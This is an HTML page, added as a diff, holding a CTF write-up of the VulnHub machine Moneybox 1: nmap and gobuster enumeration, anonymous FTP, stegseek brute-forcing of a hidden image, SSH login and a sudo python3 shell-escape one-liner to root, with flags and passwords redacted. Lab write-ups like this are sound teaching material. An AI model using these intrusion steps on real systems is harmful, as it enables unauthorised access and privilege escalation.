@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html class="dark" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <!-- ============================================================
+         PRIMARY SEO
+         ============================================================ -->
+    <title>Moneybox 1 Writeup — VulnHub Easy · FTP Steg + Python Privesc</title>
+    <meta name="description" content="Full writeup for Moneybox 1 (VulnHub, Easy, Linux): anonymous FTP, steganography with stegseek, SSH initial access, and sudo python3 GTFObins privilege escalation to root."/>
+    <meta name="keywords" content="Moneybox 1 writeup, VulnHub Moneybox, steganography CTF, stegseek writeup, FTP anonymous login CTF, sudo python3 privesc, GTFObins python, Linux CTF easy, privilege escalation writeup, Th0mas_sh316y"/>
+    <meta name="author" content="Th0mas_sh316y"/>
+    <meta name="robots" content="index, follow, max-image-preview:large"/>
+    <link rel="canonical" href="https://dorsiawave.dorsia74964.workers.dev/post-moneybox.html"/>
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article"/>
+    <meta property="og:title" content="Moneybox 1 — VulnHub Easy Writeup · Th0mas_sh316y"/>
+    <meta property="og:description" content="Anonymous FTP, hidden image steganography, SSH access, and a clean sudo python3 root. Step-by-step VulnHub walkthrough."/>
+    <meta property="og:url" content="https://dorsiawave.dorsia74964.workers.dev/post-moneybox.html"/>
+    <meta property="og:image" content="https://dorsiawave.dorsia74964.workers.dev/assests/MoneyboxCard.png"/>
+    <meta property="og:site_name" content="Th0mas_sh316y — Security Engineer"/>
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="Moneybox 1 Writeup — VulnHub Easy · Th0mas_sh316y"/>
+    <meta name="twitter:description" content="FTP anon login → stegseek → SSH → sudo python3 → root. Full walk-through of Moneybox 1."/>
+    <meta name="twitter:site" content="@Th0mas_sh316y"/>
+    <meta name="twitter:image" content="https://dorsiawave.dorsia74964.workers.dev/assests/MoneyboxCard.png"/>
+
+    <!-- JSON-LD: TechArticle + BreadcrumbList -->
+    <script type="application/ld+json">
+    [
+      {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "Moneybox 1 — VulnHub Easy Writeup",
+        "description": "Step-by-step exploitation writeup: anonymous FTP enumeration, steganography with stegseek, SSH initial access, and sudo python3 privilege escalation to root.",
+        "author": { "@type": "Person", "name": "Th0mas_sh316y" },
+        "datePublished": "2026-04-23",
+        "url": "https://dorsiawave.dorsia74964.workers.dev/post-moneybox.html",
+        "inLanguage": "en",
+        "keywords": "VulnHub, Moneybox, steganography, FTP, python privesc, GTFObins"
+      },
+      {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://dorsiawave.dorsia74964.workers.dev/" },
+          { "@type": "ListItem", "position": 2, "name": "CTF Writeups", "item": "https://dorsiawave.dorsia74964.workers.dev/ctf.html" },
+          { "@type": "ListItem", "position": 3, "name": "Moneybox 1", "item": "https://dorsiawave.dorsia74964.workers.dev/post-moneybox.html" }
+        ]
+      }
+    ]
+    </script>
+
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+
+    <!-- ============================================================
+         THEME CONFIG — identical on every page, do not change
+         ============================================================ -->
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "outline": "#8d90a1","background": "#0a0a0a","surface-container-low": "#161616",
+                        "on-primary": "#ffffff","outline-variant": "#2a2a2a","on-surface": "#e2e2e2",
+                        "on-surface-variant": "#a0a0a0","primary-container": "#3366ff","surface": "#0a0a0a",
+                        "surface-container": "#121212","primary": "#3366ff","error": "#ffb4ab",
+                        "surface-variant": "#1a1a1a","surface-container-lowest": "#050505",
+                        "on-error": "#690005","on-background": "#e2e2e2"
+                    },
+                    "borderRadius": { "DEFAULT": "0px","lg": "0px","xl": "0px","full": "9999px" },
+                    "fontFamily": { "headline": ["Space Grotesk"],"body": ["Inter"],"label": ["Space Grotesk"] }
+                },
+            },
+        }
+    </script>
+    <link rel="stylesheet" href="style.css"/>
+</head>
+<body class="text-on-surface font-body selection:bg-primary selection:text-on-primary min-h-screen">
+<div class="bg-vignette"></div>
+
+<!-- NAV — CTF Writeups is active -->
+<nav class="fixed top-0 w-full z-50 bg-background/80 backdrop-blur-md border-b border-outline-variant">
+    <div class="flex justify-between items-center w-full px-8 py-5 max-w-[1440px] mx-auto">
+        <div class="text-xl font-bold tracking-tighter text-primary font-headline">Th0mas_sh316y</div>
+        <div class="hidden md:flex items-center space-x-10">
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="index.html">Home</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="blog.html">Blog</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-primary" href="ctf.html">CTF Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<main class="pt-24 pb-20 max-w-[1440px] mx-auto px-8 lg:px-12">
+
+    <!-- POST HEADER -->
+    <header class="mb-16">
+        <div class="flex items-center gap-4 mb-6 flex-wrap">
+            <span class="bg-surface-variant text-primary text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-primary/30">CTF WRITEUP</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">VULNHUB</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">BLACK BOX</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">LINUX</span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-bold text-primary tracking-tight leading-none mb-8 font-headline">
+            Moneybox 1 — VulnHub Easy
+        </h1>
+        <div class="flex flex-col md:flex-row md:items-center gap-8 border-l-2 border-primary/40 pl-6">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-surface-container-low border border-outline-variant flex items-center justify-center">
+                    <span class="material-symbols-outlined text-primary" style="font-size:18px;">person</span>
+                </div>
+                <div>
+                    <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Written By</p>
+                    <p class="text-sm font-headline font-bold text-on-surface">Th0mas_sh316y</p>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider mb-1">Difficulty</p>
+                <div class="flex gap-1">
+                    <span class="w-2 h-2 bg-primary"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Platform</p>
+                <p class="text-sm font-headline font-bold text-on-surface">VulnHub</p>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Target IP</p>
+                <p class="text-sm font-mono font-bold text-primary">192.168.1.12</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO THUMBNAIL -->
+    <div class="mb-12 relative overflow-hidden border border-outline-variant/60 group" style="height:280px;">
+        <img src="assests/MoneyboxCard.png" alt="Moneybox 1 Machine" class="w-full h-full object-cover grayscale group-hover:grayscale-0 opacity-50 group-hover:opacity-75 group-hover:scale-105 transition-all duration-1000"/>
+        <div class="absolute inset-0 bg-gradient-to-t from-background via-background/30 to-transparent pointer-events-none"></div>
+        <div class="absolute bottom-4 left-6 flex items-center gap-3">
+            <span class="w-2 h-2 bg-primary animate-pulse"></span>
+            <span class="font-label text-[9px] uppercase tracking-[0.3em] text-primary">Machine: Moneybox 1 · Easy · Linux · VulnHub</span>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-[1fr_280px] gap-16 items-start">
+
+        <!-- ARTICLE BODY -->
+        <article class="space-y-12">
+
+            <!-- SECTION 0: Introduction -->
+            <section id="introduction">
+                <p class="text-xl font-body text-on-surface-variant leading-relaxed">
+                    Moneybox 1 is an Easy-rated VulnHub machine that doesn't waste your time. The intended path is clean — anonymous FTP, a hidden image with credentials tucked inside via steganography, SSH in, and a sudo misconfiguration that hands you root in one command. I finished it in about an hour and a half, though the steghide passphrase took longer than I'd care to admit.
+                </p>
+            </section>
+
+            <!-- SECTION 1: Recon -->
+            <section class="space-y-6" id="recon">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">01_Reconnaissance</h2>
+                <p class="text-on-surface-variant leading-relaxed">Standard nmap sweep to start. Three ports — FTP (21), HTTP (80), and SSH (22). Nothing exotic. The FTP version banner comes back as vsftpd 3.0.3, and nmap's default scripts flag it as allowing anonymous login. That's the thread to pull.</p>
+
+                <!-- Terminal Block -->
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nmap</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap -sC -sV -p- --min-rate 5000 192.168.1.12</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0  0  146764 May 01 2021 trytofind.jpg
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: MoneyBox
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Key Finding</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">Anonymous FTP lists a file called <code class="text-primary">trytofind.jpg</code>. The name is a hint from the machine author. Nine times out of ten in Easy VulnHub boxes, if there's an image in an anonymous FTP share — check it for steganography.</p>
+                </div>
+            </section>
+
+            <!-- SECTION 2: FTP Enumeration -->
+            <section class="space-y-6" id="ftp-enum">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">02_FTP_Enumeration</h2>
+                <p class="text-on-surface-variant leading-relaxed">Anonymous FTP is one of those vulnerabilities that shouldn't exist on anything facing an untrusted network, but here we are. Logged in as <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">anonymous</code> with no password, grabbed the image, and disconnected. Two commands.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / ftp anonymous</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ ftp 192.168.1.12</span>
+Connected to 192.168.1.12.
+220 (vsFTPd 3.0.3)
+Name (192.168.1.12:kali): anonymous
+Password: [blank]
+
+230 Login successful.
+ftp> ls
+-rw-r--r--    1 0  0  146764 May 01 2021 trytofind.jpg
+
+ftp> get trytofind.jpg
+<span class="text-on-surface font-bold bg-primary/10 px-1">226 Transfer complete.</span>
+ftp> bye</pre>
+                </div>
+            </section>
+
+            <!-- SECTION 3: Web Enumeration -->
+            <section class="space-y-6" id="web-enum">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">03_Web_Enumeration</h2>
+                <p class="text-on-surface-variant leading-relaxed">While stegseek ran in the background I hit the web server. Port 80 shows a basic landing page with the "MoneyBox" branding — nothing in the visible content, but the source was worth a look. Gobuster turned up a <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/blogs</code> directory pretty quickly.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / gobuster</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ gobuster dir -u http://192.168.1.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</span>
+
+/index.html           (Status: 200) [Size: 1234]
+<span class="text-on-surface font-bold bg-primary/10 px-1">/blogs                (Status: 301) [Size: 313]</span>
+/server-status        (Status: 403) [Size: 277]</pre>
+                </div>
+
+                <p class="text-on-surface-variant leading-relaxed">Navigating to <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">http://192.168.1.12/blogs</code> and viewing the page source reveals a commented-out hint. The developer left a username sitting in an HTML comment — the kind of thing that gets flagged immediately in a real engagement.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">browser / page source</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold"># view-source:http://192.168.1.12/blogs/index.html</span>
+
+&lt;!-- the hint is -&gt; <span class="text-on-surface font-bold bg-primary/10 px-1">user: renu</span> --&gt;</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">OSINT Note</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">HTML comments in production are a real vulnerability class — I've seen client engagements where staging credentials ended up in commented-out form fields. Always check source on every page, especially anything with a login or registration form nearby.</p>
+                </div>
+            </section>
+
+            <!-- SECTION 4: Steganography -->
+            <section class="space-y-6" id="steganography">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">04_Steganography</h2>
+                <p class="text-on-surface-variant leading-relaxed">Back to the image. Steghide needs a passphrase — stegseek automates the brute force against rockyou.txt. Took maybe two minutes. The extracted file is <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">passcode.txt</code>, which contains the SSH password for user <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">renu</code>.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / stegseek</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ stegseek trytofind.jpg /usr/share/wordlists/rockyou.txt</span>
+
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "[REDACTED]"
+[i] Original filename: "passcode.txt"
+<span class="text-on-surface font-bold bg-primary/10 px-1">[i] Extracting to "trytofind.jpg.out"</span>
+
+<span class="text-primary font-bold">$ cat trytofind.jpg.out</span>
+[REDACTED]</pre>
+                </div>
+
+                <p class="text-on-surface-variant leading-relaxed">I tried steghide directly before stegseek and kept guessing common passwords manually — <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">password</code>, <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">moneybox</code>, the machine name. Wasted fifteen minutes. Just use stegseek from the start.</p>
+            </section>
+
+            <!-- SECTION 5: SSH Initial Access -->
+            <section class="space-y-6" id="ssh-access">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">05_SSH_Initial_Access</h2>
+                <p class="text-on-surface-variant leading-relaxed">Username from the web comment, password from the image. SSH in and grab the user flag from the home directory.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / ssh</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ ssh renu@192.168.1.12</span>
+renu@192.168.1.12's password: [REDACTED]
+
+renu@MoneyBox:~$ ls
+user.txt
+
+renu@MoneyBox:~$ cat user.txt
+<span class="text-on-surface font-bold bg-primary/10 px-1">[REDACTED]</span></pre>
+                </div>
+            </section>
+
+            <!-- SECTION 6: Privilege Escalation -->
+            <section class="space-y-6" id="privesc">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">06_PrivEsc_via_Sudo_Python3</h2>
+                <p class="text-on-surface-variant leading-relaxed">First thing I check after landing a shell — <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">sudo -l</code>. The output here is about as generous as it gets: <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">renu</code> can run <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/usr/bin/python3</code> as root with no password. GTFObins has the exact one-liner for this.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / privesc</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">renu@MoneyBox:~$ sudo -l</span>
+Matching Defaults entries for renu on MoneyBox:
+    env_reset, mail_badpass, secure_path=...
+
+User renu may run the following commands on MoneyBox:
+<span class="text-on-surface font-bold bg-primary/10 px-1">    (ALL) NOPASSWD: /usr/bin/python3</span>
+
+<span class="text-primary font-bold"># GTFObins — sudo python3 shell escape</span>
+renu@MoneyBox:~$ sudo python3 -c 'import os; os.system("/bin/sh")'
+
+# id
+<span class="text-on-surface font-bold bg-primary/10 px-1">uid=0(root) gid=0(root) groups=0(root)</span>
+
+# cat /root/root.txt
+[REDACTED]</pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Technique Note — GTFObins</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">Any scripting language available via <code class="text-primary">sudo NOPASSWD</code> is effectively a root shell. Python3's <code class="text-primary">os.system()</code> spawns a process that inherits the invoking privilege. Same applies to perl, ruby, lua, node — if it can exec, it can escalate. Reference: <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank" class="text-primary hover:underline">GTFObins/python</a>.</p>
+                </div>
+            </section>
+
+            <!-- Attack Chain Summary -->
+            <section class="space-y-4" id="summary">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">07_Attack_Chain_Summary</h2>
+                <div class="bg-surface-container-low border border-outline-variant p-8">
+                    <ol class="space-y-4 font-label text-xs uppercase tracking-widest text-on-surface-variant">
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">01</span> Nmap → ports 21 (FTP anon), 80 (HTTP), 22 (SSH)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">02</span> Anonymous FTP login → download trytofind.jpg</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">03</span> Gobuster → /blogs directory discovered</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">04</span> /blogs page source → HTML comment reveals username: renu</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">05</span> stegseek trytofind.jpg rockyou.txt → extracts passcode.txt with SSH password</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">06</span> SSH as renu → user.txt</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">07</span> sudo -l → (ALL) NOPASSWD: /usr/bin/python3</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">08</span> sudo python3 GTFObins one-liner → ROOT → root.txt</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="pt-12 border-t border-outline-variant flex flex-col md:flex-row justify-between items-center gap-6">
+                <a href="ctf.html" class="flex items-center gap-2 text-xs font-label font-bold text-on-surface-variant uppercase hover:text-primary transition-colors">
+                    <span class="material-symbols-outlined" style="font-size:16px;">arrow_back</span> Back to CTF Lab
+                </a>
+                <div class="flex flex-wrap gap-2">
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#STEGANOGRAPHY</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#FTP_ANON</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#VULNHUB</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#GTFOBINS</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#PRIVESC</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#PYTHON</span>
+                </div>
+            </footer>
+        </article>
+
+        <!-- SIDEBAR -->
+        <aside class="sticky top-32 space-y-10 hidden lg:block">
+            <nav class="space-y-4">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em]">Table of Contents</h4>
+                <ul class="space-y-3 border-l border-outline-variant">
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-primary border-l-2 border-primary -ml-[1.5px]" href="#introduction">00_Introduction</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#recon">01_Reconnaissance</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#ftp-enum">02_FTP_Enumeration</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#web-enum">03_Web_Enumeration</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#steganography">04_Steganography</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#ssh-access">05_SSH_Initial_Access</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#privesc">06_PrivEsc_Python3</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#summary">07_Attack_Chain</a></li>
+                </ul>
+            </nav>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-5">Machine Info</h4>
+                <div class="space-y-3">
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Machine</span><span class="text-xs font-headline font-bold text-on-surface">Moneybox 1</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Author</span><span class="text-xs font-headline font-bold text-on-surface">Th0mas_sh316y</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Platform</span><span class="text-xs font-headline font-bold text-on-surface">VulnHub</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Type</span><span class="text-xs font-headline font-bold text-on-surface">Black Box</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Difficulty</span><span class="text-xs font-headline font-bold text-on-surface/60">Easy</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Target IP</span><span class="text-xs font-mono font-bold text-primary">192.168.1.12</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Status</span><span class="text-xs font-headline font-bold text-primary">Pwned ✓</span></div>
+                </div>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Download VM</h4>
+                <a href="https://www.vulnhub.com/entry/moneybox-1,653/" target="_blank"
+                   class="flex items-center gap-3 text-[10px] font-label font-bold text-primary uppercase tracking-widest border-b border-primary/30 pb-1 hover:border-primary hover:gap-4 transition-all">
+                    VulnHub Page <span class="material-symbols-outlined" style="font-size:14px;">open_in_new</span>
+                </a>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Tools Used</h4>
+                <ul class="space-y-2">
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2">
+                        <span class="w-1 h-1 bg-primary inline-block"></span> nmap
+                    </li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2">
+                        <span class="w-1 h-1 bg-primary inline-block"></span> gobuster
+                    </li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2">
+                        <span class="w-1 h-1 bg-primary inline-block"></span> stegseek
+                    </li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2">
+                        <span class="w-1 h-1 bg-primary inline-block"></span> ftp (cli)
+                    </li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2">
+                        <span class="w-1 h-1 bg-primary inline-block"></span> GTFObins / python3
+                    </li>
+                </ul>
+            </div>
+        </aside>
+    </div>
+</main>
+
+<footer class="w-full py-16 bg-background/90 backdrop-blur-md border-t border-outline-variant mt-20">
+    <div class="flex flex-col md:flex-row justify-between items-center px-12 max-w-[1440px] mx-auto gap-10">
+        <div class="flex flex-col gap-2">
+            <span class="font-headline font-bold text-primary text-xl tracking-tighter">Th0mas_sh316y</span>
+            <span class="font-label text-[10px] text-on-surface/40 uppercase tracking-[0.4em]">Security Engineer · Pentester · Red Team</span>
+        </div>
+        <div class="flex gap-12">
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://github.com/dorsia74964" target="_blank">GitHub</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://www.linkedin.com/in/dorsia74964" target="_blank">LinkedIn</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://x.com/Th0mas_Sh316y">Twitter</a>
+        </div>
+        <div class="font-label text-[11px] tracking-widest uppercase text-on-surface/30">© 2026 Th0mas_sh316y. ALL RIGHTS RESERVED.</div>
+    </div>
+</footer>
+</body>
+</html>
